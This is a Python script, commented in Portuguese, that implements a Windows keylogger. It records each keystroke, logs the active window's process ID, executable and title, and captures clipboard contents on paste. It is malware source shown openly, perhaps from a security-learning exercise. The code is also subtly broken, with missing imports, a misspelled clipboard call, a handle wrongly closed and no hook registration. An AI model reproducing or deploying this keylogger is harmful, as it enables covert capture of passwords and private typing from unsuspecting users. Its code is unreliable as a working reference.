#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Thu Oct 10 07:45:57 2019

@author: max
"""

from ctypes import windll, c_ulong
import pythoncom
import pyhook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():
    
    # obtém um handle para a janela em primeiro plano (foreground)
    hwnd = user32.GetForegroundWindow()
    
    # Descobre o ID do processo
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    
    # Armazena o ID do processo corrente
    process_id = '%d'%pid.value
    
    # obtém o executável
    executable = create_string_buffer('\x00'*512)
    h_process = kernel32.OpenProcess(0x400|0x10, False, pid)
    
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
    
    # Agora lê o seu título
    window_title = create_string_buffer('\x00'*512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
    
    # Exibe o cabeçalho se estivermos no processo correto
    print('')
    print('[ PID: %s - %s - %s]'%(process_id, executable.value, window_title.value))
    print('')
    
    # Fecha os handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    
    
def key_stroke(event):
    
    global current_window
    
    # Verifica se houve mudança de janela no alvo
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()
        
    # Se uma tecla padrão foi pressionada
    if event.Ascii > 32 and event.Ascii < 127:
        print(chr(event.Ascii),)
    
    else:
        # Se foi um [CTRL-V], obtém o valor da área de transferência (clipboard)
        if event.Key == "V":
            win32clipboard.OpenClipbyoard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            
            print('[PASTE] - %s'%(pasted_value),)
        
        else:
            print('[%s]'%event.Key,)
        
    # Passa a execução para o próxeimo hook registrado
    return True

